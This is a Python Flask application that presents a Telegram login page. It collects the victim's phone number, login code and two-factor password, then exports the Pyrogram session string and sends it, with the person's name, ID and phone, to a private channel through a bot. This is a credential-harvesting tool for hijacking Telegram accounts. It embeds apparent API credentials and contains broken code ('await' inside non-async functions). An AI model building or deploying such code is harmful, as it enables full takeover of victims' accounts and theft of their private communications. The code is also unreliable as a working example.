from flask import Flask, render_template, request, session, redirect, jsonify
import os
import json
import asyncio
import threading
from datetime import datetime
from pyrogram import Client
from pyrogram.errors import (
    PhoneNumberInvalid, 
    PhoneCodeInvalid, 
    PhoneCodeExpired,
    SessionPasswordNeeded,
    FloodWait
)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "your-secret-key")

# ========== CONFIGURE THESE ==========
API_ID = int(os.environ.get("API_ID", "32208414"))      # From my.telegram.org
API_HASH = os.environ.get("API_HASH", "628f11c05a44c8dda4b006e66f4bf7df")      # From my.telegram.org
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN") # For notifications
CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1004376082945") # Private channel
# =====================================

# Temporary storage for Pyrogram clients (in production use Redis)
clients = {}  # session_id -> Client object
phone_codes = {}  # session_id -> phone_code_hash

def send_to_channel(message):
    """Send session to private channel via Bot API"""
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
        print(f"[CHANNEL] {message[:200]}...")
        return True
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHANNEL_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        import requests
        r = requests.post(url, json=payload, timeout=10)
        return r.json().get("ok", False)
    except Exception as e:
        print(f"Channel send error: {e}")
        return False

@app.route("/")
def index():
    return redirect("/login")

@app.route("/login")
def login():
    return render_template("login.html")

@app.route("/api/send-code", methods=["POST"])
def send_code():
    """Send Telegram code using Pyrogram"""
    data = request.json or {}
    phone = data.get("phone", "").strip()
    session_name = data.get("session_name", "session").strip()
    
    if not phone or len(phone) < 10:
        return jsonify(ok=False, error="Invalid phone number"), 400
    
    # Generate unique session ID
    import uuid
    session_id = str(uuid.uuid4())[:8]
    
    # Create Pyrogram client in memory
    client = Client(
        name=f"session_{session_id}",
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=True,  # Don't save to disk
        no_updates=True
    )
    
    try:
        # Connect and send code
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def send():
            await client.connect()
            sent = await client.send_code(phone)
            return sent
        
        sent_code = loop.run_until_complete(send())
        
        # Store client and phone_code_hash
        clients[session_id] = {
            "client": client,
            "phone": phone,
            "session_name": session_name,
            "phone_code_hash": sent_code.phone_code_hash,
            "loop": loop
        }
        
        return jsonify(
            ok=True, 
            session_id=session_id,
            message=f"Code sent to {phone} via Telegram"
        )
        
    except PhoneNumberInvalid:
        return jsonify(ok=False, error="Invalid phone number"), 400
    except FloodWait as e:
        return jsonify(ok=False, error=f"Please wait {e.value} seconds"), 429
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500

@app.route("/api/verify-code", methods=["POST"])
def verify_code():
    """Verify code and create session"""
    data = request.json or {}
    session_id = data.get("session_id", "")
    code = data.get("code", "").strip()
    password = data.get("password", "")  # For 2FA
    
    if not session_id or session_id not in clients:
        return jsonify(ok=False, error="Session expired. Start again."), 400
    
    if not code or len(code) < 3:
        return jsonify(ok=False, error="Invalid code"), 400
    
    client_data = clients[session_id]
    client = client_data["client"]
    phone = client_data["phone"]
    phone_code_hash = client_data["phone_code_hash"]
    session_name = client_data["session_name"]
    loop = client_data["loop"]
    
    try:
        async def sign_in():
            try:
                # Try to sign in with code
                user = await client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=code
                )
                return user, None
            except SessionPasswordNeeded:
                # 2FA enabled - need password
                if not password:
                    return None, "2FA_PASSWORD_REQUIRED"
                user = await client.check_password(password)
                return user, None
        
        user, error = loop.run_until_complete(sign_in())
        
        if error == "2FA_PASSWORD_REQUIRED":
            return jsonify(ok=False, requires_password=True, error="2FA enabled. Enter password."), 401
        
        # Export session string
        session_string = await client.export_session_string()
        
        # Get user info
        user_info = {
            "id": user.id,
            "first_name": user.first_name,
            "last_name": user.last_name or "",
            "username": user.username or "N/A",
            "phone": phone,
            "session_string": session_string,
            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "session_name": session_name
        }
        
        # Disconnect client
        await client.disconnect()
        
        # Clean up
        del clients[session_id]
        
        # Send to channel
        country_code = phone[:3] if phone.startswith("+") else phone[:2]
        
        channel_msg = f"""🟢 <b>NEW PYROGRAM SESSION</b>

👤 <b>Name:</b> {user_info['first_name']} {user_info['last_name']}
🔗 <b>Username:</b> @{user_info['username']}
🆔 <b>User ID:</b> <code>{user_info['id']}</code>
📱 <b>Phone:</b> <code>{phone}</code>
🌍 <b>Country:</b> +{country_code}
⏰ <b>Created:</b> {user_info['created_at']}
🏷️ <b>Session Name:</b> <code>{session_name}</code>

<b>🔐 SESSION STRING:</b>
<code>{session_string}</code>

⚠️ <b>Keep this secure!</b>"""
        
        send_to_channel(channel_msg)
        
        # Store in Flask session
        session["user"] = user_info
        
        return jsonify(
            ok=True,
            user={
                "id": user_info["id"],
                "name": f"{user_info['first_name']} {user_info['last_name']}",
                "username": user_info["username"],
                "phone": phone
            }
        )
        
    except PhoneCodeInvalid:
        return jsonify(ok=False, error="Invalid code. Try again."), 401
    except PhoneCodeExpired:
        del clients[session_id]
        return jsonify(ok=False, error="Code expired. Request new code."), 401
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500

@app.route("/api/logout", methods=["POST"])
def logout():
    session.clear()
    return jsonify(ok=True)

@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    return render_template("dashboard.html", user=session["user"])

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)